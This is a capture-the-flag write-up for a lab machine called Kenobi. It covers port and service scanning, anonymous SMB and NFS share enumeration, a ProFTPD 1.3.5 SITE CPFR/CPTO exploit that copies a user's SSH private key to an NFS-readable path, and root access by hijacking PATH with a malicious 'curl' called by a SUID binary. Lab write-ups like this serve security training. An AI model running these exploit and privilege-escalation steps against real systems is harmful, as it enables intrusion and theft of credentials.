# Open Port Discovery

```bash
$ masscan -p1-65535 10.10.7.177 --rate=1000 -e tun0 --output-format grepable --output-filename kenobi.masscan
$ cat kenobi.masscan 

# Masscan 1.3.2 scan initiated Sat Jul 10 04:17:02 2021
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Timestamp: 1625890627 Host: 10.10.7.177 () Ports: 21/open/tcp//ftp//
Timestamp: 1625890628 Host: 10.10.7.177 () Ports: 2049/open/tcp//nfs//
Timestamp: 1625890633 Host: 10.10.7.177 () Ports: 22/open/tcp//ssh//
Timestamp: 1625890639 Host: 10.10.7.177 () Ports: 139/open/tcp//netbios-ssn//
Timestamp: 1625890648 Host: 10.10.7.177 () Ports: 50207/open/tcp//unknown//
Timestamp: 1625890662 Host: 10.10.7.177 () Ports: 37741/open/tcp//unknown//
Timestamp: 1625890665 Host: 10.10.7.177 () Ports: 44069/open/tcp//unknown//
Timestamp: 1625890676 Host: 10.10.7.177 () Ports: 41389/open/tcp//unknown//
Timestamp: 1625890686 Host: 10.10.7.177 () Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1625890721 Host: 10.10.7.177 () Ports: 111/open/tcp//sunrpc//
Timestamp: 1625890747 Host: 10.10.7.177 () Ports: 80/open/tcp//http//
```

# Open Port Enumeration

```bash
$ nmap -sC -sV -O -p111,139,2049,21,22,37741,41389,44069,445,50207,80 10.10.7.177 -oA kenobi

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 23:27 CDT 
Nmap scan report for 10.10.7.177 
Host is up (0.097s latency). 
PORT STATE SERVICE VERSION 
21/tcp open ftp ProFTPD 1.3.5 
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey: 
| 2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA) 
| 256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA) 
|_ 256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519) 
80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 
| http-robots.txt: 1 disallowed entry 
|_/admin.html 
|_http-server-header: Apache/2.4.18 (Ubuntu) 
|_http-title: Site doesn't have a title (text/html). 
111/tcp open rpcbind 2-4 (RPC #100000) 
| rpcinfo: 
| program version port/proto service 
| 100000 2,3,4 111/tcp rpcbind 
| 100000 2,3,4 111/udp rpcbind 
| 100000 3,4 111/tcp6 rpcbind 
| 100000 3,4 111/udp6 rpcbind 
| 100003 2,3,4 2049/tcp nfs 
| 100003 2,3,4 2049/tcp6 nfs 
| 100003 2,3,4 2049/udp nfs
| 100003 2,3,4 2049/udp6 nfs
| 100005 1,2,3 41389/tcp mountd
| 100005 1,2,3 48599/udp mountd
| 100005 1,2,3 54205/tcp6 mountd
| 100005 1,2,3 60359/udp6 mountd
| 100021 1,3,4 36101/tcp6 nlockmgr
| 100021 1,3,4 37741/tcp nlockmgr
| 100021 1,3,4 38108/udp nlockmgr
| 100021 1,3,4 43706/udp6 nlockmgr
| 100227 2,3 2049/tcp nfs_acl
| 100227 2,3 2049/tcp6 nfs_acl
| 100227 2,3 2049/udp nfs_acl
|_ 100227 2,3 2049/udp6 nfs_acl
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open nfs_acl 2-3 (RPC #100227) 
37741/tcp open nlockmgr 1-4 (RPC #100021) 
41389/tcp open mountd 1-3 (RPC #100005)      
44069/tcp open mountd 1-3 (RPC #100005) 
50207/tcp open mountd 1-3 (RPC #100005) 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Cam
era (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
| OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
| Computer name: kenobi
| NetBIOS computer name: KENOBI\x00
| Domain name: \x00
| FQDN: kenobi
|_ System time: 2021-07-09T23:27:26-05:00
| smb-security-mode: 
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
| 2.02: 
|_ Message signing enabled but not required
| smb2-time: 
| date: 2021-07-10T04:27:26
|_ start_date: N/A


OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
```

# SMB Enumeration

```bash
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.7.177

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 23:35 CDT
Nmap scan report for 10.10.7.177
Host is up (0.12s latency).

PORT STATE SERVICE
445/tcp open microsoft-ds

Host script results:
| smb-enum-shares: 
| account_used: guest
| \\10.10.7.177\IPC$: 
| Type: STYPE_IPC_HIDDEN
| Comment: IPC Service (kenobi server (Samba, Ubuntu))
| Users: 1
| Max Users: <unlimited>
| Path: C:\tmp
| Anonymous access: READ/WRITE
| Current user access: READ/WRITE
| \\10.10.7.177\anonymous: 
| Type: STYPE_DISKTREE
| Comment: 
| Users: 0
| Max Users: <unlimited>
| Path: C:\home\kenobi\share
| Anonymous access: READ/WRITE
| Current user access: READ/WRITE
| \\10.10.7.177\print$: 
| Type: STYPE_DISKTREE
| Comment: Printer Drivers
| Users: 0
| Max Users: <unlimited>
| Path: C:\var\lib\samba\printers
| Anonymous access: <none>
|_ Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 14.91 seconds
```

## Browse SMB shares

### `anonymous`

```bash
smbclient -U anonymous //10.10.112.146/anonymous
```

Found file `log.txt`, which appears to be the ProFTPD/Sambda configuration file. Contains some valuable information:

- A valid username: `kenobi`
- `kenobi`'s SSH key fingerprint: `SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi`
- `kenobi`'s SSH key randomart image

# NFS Enumeration

## NFS Shares

```bash
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.112.146
  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 22:31 CDT
Nmap scan report for 10.10.112.146
Host is up (0.15s latency).

PORT STATE SERVICE
111/tcp open rpcbind
| nfs-showmount: 
|_ /var *
```

- Found NFS mount `/var`

# ProFTPd 1.3.5 Exploitation

> ProFTPd version 1.3.5 has a vulnerability that allows an unauthenticated user to copy a file from one part of the target file system to another under the privilege context of the user running ProFTPd. This is achieved by connecting to the ProFTPd (via netcat for example) and issuing a `SITE CPFR` (site copy from) command with the path of the file to copy, and then issuing a `SITE CPTO` (site copy to) command with the path to copy the file to.

For our situation, we know `kenobi` is running `ProFTPd` from the `ProFTPd` configuration file we found in the `anonymous` SMB share. We also know that he has a private SSH key at `/home/kenobi/.ssh/id_rsa`. `/var` on the target machine can be mounted over NFS. Thus, we can leverage the ProFTPd 1.3.5 vulnerability to transfer `kenobi`'s SSH private key to somewhere in `/var`, which will allow us to read it.

## Exploitating the Vulnerability

```bash
nc 10.10.112.146 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.112.146]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Once logged in as `kenobi`, read `/home/kenobi/user.txt`.

# Kenobi: Privilege Escalation Enumeration

## Search for SUID executables

```bash
$ find / -user root -perm -4000 -print 2>/dev/null

/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

`/usr/bin/menu` looks out of the ordinary.

## `menu` SUID executable

```bash
$ ls -la /usr/bin/menu

-rwsr-xr-x 1 root root 8880 Sep 4 2019 /usr/bin/menu
```

SUID and owned by `root`.

Running it, we get three options. #1 sends an HTTP request to the Apache web server.

```bash
$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Sun, 11 Jul 2021 04:04:40 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

#2 appears to run `uname` to get the kernel version.

```bash
$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic
```

#3 appears to run `ifconfig` to list network interfaces.

```bash
$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0 Link encap:Ethernet HWaddr 02:48:99:b3:0d:19 
 inet addr:10.10.112.146 Bcast:10.10.255.255 Mask:255.255.0.0
 inet6 addr: fe80::48:99ff:feb3:d19/64 Scope:Link
 UP BROADCAST RUNNING MULTICAST MTU:9001 Metric:1
 RX packets:2012 errors:0 dropped:0 overruns:0 frame:0
 TX packets:1658 errors:0 dropped:0 overruns:0 carrier:0
 collisions:0 txqueuelen:1000 
 RX bytes:189986 (189.9 KB) TX bytes:275705 (275.7 KB)

lo Link encap:Local Loopback 
 inet addr:127.0.0.1 Mask:255.0.0.0
 inet6 addr: ::1/128 Scope:Host
 UP LOOPBACK RUNNING MTU:65536 Metric:1
 RX packets:212 errors:0 dropped:0 overruns:0 frame:0
 TX packets:212 errors:0 dropped:0 overruns:0 carrier:0
 collisions:0 txqueuelen:1 
 RX bytes:15882 (15.8 KB) TX bytes:15882 (15.8 KB)
```

Running `strings` on it:

```bash
$ strings /usr/bin/menu

libc.so.6
setuid
puts
printf
system
AWAVA
AUATL
curl -I localhost
uname -r
ifconfig
 Invalid choice
crtstuff.c
menu.c
```

- Removed all of the uninteresting strings

This shows us that for each menu option, `menu` is running either `curl`, `uname`, or `ifconfig` without a full path. If I can place an executable `curl` before the legitimate `curl` in the `PATH`, I can have it execute with `root` privileges.

# Kenobi Privilege Escalation - PATH Manipulation

`/home/kenobi/.local/bin/` comes before `/usr/bin/` in the `PATH` variable.

## Create malicious `curl` in `/home/kenobi/.local/bin`

```bash
cd /home/kenobi
mkdir .local
mkdir .local/bin
echo '#!/bin/bash' > .local/bin/curl
echo 'cp /root/*.txt .' >> .local/bin/curl
chmod 777 .local/bin/curl
export PATH=$PATH
```

## Run `menu` and select option #1 to get the `root` flag